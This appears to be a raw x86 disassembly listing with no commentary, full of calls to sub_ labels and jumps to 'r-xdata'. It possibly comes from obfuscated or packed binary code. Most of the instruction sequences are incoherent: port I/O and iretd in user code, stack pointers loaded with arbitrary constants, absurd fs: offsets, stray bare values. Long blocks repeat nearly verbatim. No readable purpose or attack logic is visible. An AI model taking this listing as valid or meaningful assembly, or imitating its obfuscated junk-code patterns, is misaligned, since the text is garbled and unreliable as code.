mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a67
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5c8
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bae3
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403f8d
pop ecx
pop edx
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
add edx 0xff108f0f
pop edx
mov eax 0xff55870f
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fda1
ja r-xdata
call 0xffcb8b0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a47c77
jg r-xdata
and ebx 0xff5a870f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop edx
pop edx
jae r-xdata
jne r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jae r-xdata
ja r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
pushfd
push esi
call sub_404011
sub ebx 0xa48f0f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
ja r-xdata
jge 0x71fc7f19
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bedb
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c712
add [ eax ] al
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jno r-xdata
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40412b
add esi 0xa6830f
add [ eax ] al
mov ebx 0xf04c483
jae r-xdata
ja 0xffffffffa3c34fd6
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
pop eax
ja r-xdata
xor edx 0x880f5e7f
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fdd
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
push ebp
pushfd
call sub_40401a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jne r-xdata
or edx 0xf3812e79
jg r-xdata
jpo 0xdec5bc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
pop eax
jge r-xdata
jge 0xffffffffffa2c2c6
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17e00
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jg r-xdata
ja 0xffffffffff9bc293
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
pop ecx
jns r-xdata
jno 0xffffffff874f7579
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jno r-xdata
and ebx 0x870f4975
jae r-xdata
call sub_4041a2
jb 0xffffffff81b2be58
or edx 0x54549c55
ja r-xdata
xor ebx 0xff3d870f
call sub_403f8d
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
jmp 0xffffffffff79c0d4
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12ea
add esp 0x4
jae r-xdata
jl 0xf3c36e
jg r-xdata
add eax 0x5abb2979
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c629
pop eax
jg r-xdata
jge 0xffffffff894f9a67
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd522d
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jno r-xdata
jae 0xffffffff8428bae3
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5c8
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403fdd
ja r-xdata
jno r-xdata
jl 0x2f28dc3e
jno r-xdata
jl 0xfffffffff6c1fda1
add [ eax ] al
add [ edx + 0x7504c483 ] bh
pop edx
pop edx
jns 0xffffffff81501c4c
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jne r-xdata
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c712
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jg r-xdata
xor ecx 0xff70810f
jae r-xdata
ja 0xffffffff89a47c77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffcb8b0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
or ebx 0xff6e8f0f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
ja r-xdata
xor ebx 0xff3d870f
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
jae r-xdata
ja 0xffffffffa3c34fd6
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
jmp 0xffffffffff79c0d4
ja r-xdata
jge 0x71fc7f19
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bedb
jg r-xdata
jpo 0xdec5bc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
add eax 0x5abb2979
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17e00
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_404011
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40412b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
call [ 0xffffffffc181727f ]
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fdd
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc293
jae r-xdata
add edx 0xff108f0f
call sub_403f8d
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
rol [ ecx + 0x108f0fc2 ] 0xff
push ebp
pushfd
call sub_40401a
mov edx 0x7504c483
mov esp 0xe2818371
jne r-xdata
or edx 0xf3812e79
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505ab
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12ea
jae r-xdata
call sub_4041a2
jb 0xffffffff81b2be58
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
pop eax
jge r-xdata
jge 0xffffffffffa2c2c6
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb606
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c629
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
pop ecx
jns r-xdata
jno 0xffffffff874f7579
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd522d
add esp 0x4
jae r-xdata
jl 0xf3c36e
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_404048
jae 0xffffffffff43c86d
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a67
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8919504
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5c8
push edi
call sub_40429a
jg 0xfffffffff0b39cc1
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d144
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637bd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c97
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bae3
jae r-xdata
call 0xffffffff854f9cd1
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df72
jo 0xffffffffa2c15185
push ecx
push edx
call sub_40426a
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175c7
push edx
call sub_404206
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404281
jo 0xff9b86e
jo 0xffffffff894f9cab
jae r-xdata
je 0xffffffffff6dc6b5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_404244
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042ea
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7f5
push esp
pushfd
push ecx
sub esp 0xc
call sub_404267
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_404011
pop ecx
ja r-xdata
pop edx
ja r-xdata
jae 0xffffffff81ceb576
pop eax
jns r-xdata
jno 0xffffffffefc17e00
out dx eax
jae r-xdata
jne 0xffffffffe3c2220f
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fdd
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jg r-xdata
sub edi 0x5c755a59
ja r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jno r-xdata
jno 0xfffffffff1c1c946
ja r-xdata
jge 0x71fc7f19
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
ja r-xdata
and edx 0xff42850f
jno r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c712
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fda1
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
jmp [ 0xfffffffff381df77 ]
jno r-xdata
sub esi 0x89641f79
push ebp
pushfd
call sub_40401a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffcb8b0
cmp [ edi + 0x7f ] 0x81

jae r-xdata
ja 0xffffffff89a47c77
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
jge r-xdata
jge 0xffffffffffa2c2c6
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jg r-xdata
pop edx
pop edx
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bedb
pop ecx
jns r-xdata
jno 0xffffffff874f7579
pushfd
push esi
call sub_404011
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40412b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
jae r-xdata
ja 0xffffffffa3c34fd6
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdec5bc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043ab
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a34
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40403d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905f0
jg r-xdata
ja 0xcac3ec
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf45081f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904f6
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc293
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
pop edx
jge r-xdata
jo 0xffffffff854f9ae5
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
